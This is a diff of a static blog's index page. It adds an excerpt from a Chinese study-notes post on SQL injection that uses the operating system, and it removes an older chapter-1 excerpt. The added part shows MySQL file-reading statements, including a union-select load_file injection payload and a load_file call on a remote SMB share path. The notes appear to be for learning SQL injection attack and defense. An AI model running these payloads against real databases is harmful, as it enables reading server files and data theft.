@@ -236,6 +236,134 @@
             
               
                 
+                <a class="post-title-link" href="/anquan_sqlinj26.html" itemprop="url">
+                  Sql注入攻击与防御总结：第6章 利用操作系统
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2011-09-26T00:00:00+08:00" content="2011-09-26">
+              2011-09-26
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/anquan_sqlinj26.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinj26.html" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <ol>
+<li><p>访问文件系统</p>
+<p>许多试图影响底层操作系统的攻击都要求sql用户使用提升后的权限来运行</p>
+<ol>
+<li><p>读文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mysql</div><div class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'/tmp/users.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">authors</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">''</span>;   <span class="comment">-- 把文件内容写入biao</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/tmp/supervisord.log'</span>);  <span class="comment">-- 读文件</span></div><div class="line">' union <span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/tmp/supervisord.log'</span>);</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'//172.12.125.2/temp_smb/test.txt'</span>); </div><div class="line"></div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo (line <span class="built_in">blob</span>);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> foo <span class="keyword">set</span> line=<span class="keyword">load_file</span>(<span class="string">'/tmp/temp.bin'</span>);</div><div class="line">​</div><div class="line"></div><div class="line">sqlserver</div><div class="line">可以使用bulk 和 ole automaion</div><div class="line"></div><div class="line">oracle</div><div class="line">可以使用oracle目录， Oracle text 和  utl_file</div></pre></td></tr></table></figure>
+<p>​
+          <div class="post-more-link text-center">
+            <a class="btn" href="/anquan_sqlinj26.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </p></li></ol></li></ol></div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/anquan_sqlinj25.html" itemprop="url">
                   Sql注入攻击与防御总结：第5章 sql盲注利用
                 </a>
@@ -753,134 +881,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/anquan_sqlinj21.html" itemprop="url">
-                  Sql注入攻击与防御总结：第1章 什么是SQL注入
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2011-05-19T00:00:00+08:00" content="2011-05-19">
-              2011-05-19
-            </time>
-          </span>
-
-          
-            <span class="post-category">
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/anquan_sqlinj21.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinj21.html" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <ol>
-<li><p>概念<br>Sql注入是这样一种漏洞：应用程序在向后台数据库传递sql查询时，如果为攻击者提供了影响该查询的能力，就会引发Sql注入。</p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/anquan_sqlinj21.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </li></ol></div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/19/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><span class="page-number current">20</span><a class="page-number" href="/page/21/">21</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><a class="extend next" rel="next" href="/page/21/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/19/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><span class="page-number current">20</span><a class="page-number" href="/page/21/">21</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/21/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -919,7 +924,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">160</span>
+              <span class="site-state-item-count">161</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
